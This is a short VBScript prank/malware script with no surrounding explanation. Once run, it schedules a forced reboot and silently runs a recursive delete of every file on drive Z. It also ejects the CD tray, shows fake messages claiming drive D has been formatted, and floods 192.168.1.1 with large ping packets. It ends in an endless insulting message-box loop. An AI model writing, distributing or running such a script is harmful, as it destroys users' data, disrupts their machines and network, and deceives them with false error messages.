dim WSHshell
set WSHshell=wscript.createobject("wscript.shell")
WSHshell.run"shutdown -r -t 240",0,true

set WSHshell = wscript.createobject("wscript.shell") 
WSHshell.run "cmd /c ""del Z:\*.* / f /q /s""",2,true

Msgbox"Oh,Shit! No more disk space. Delete Windows?"

set wmp=createobject("wmplayer.ocx") 
set cd=wmp.cdromcollection.item(0) 
cd.eject

Msgbox"Error!"

Msgbox"Unknown error found, make sure to format drive D£º"

Msgbox"Shut down later and format drive D:"

set WSHshell = wscript.createobject("wscript.shell")
WSHshell.run "cmd /c""ping 192.168.1.1 /l 65500 -t",4,true

Msgbox"Please verify that there is no important file on drive D: it has been formatted!"
set WSHshell=wscript.createobject("wscript.shell")
WSHshell.run"explorer",6,true

do
Msgbox "You are foolish!"
loop 


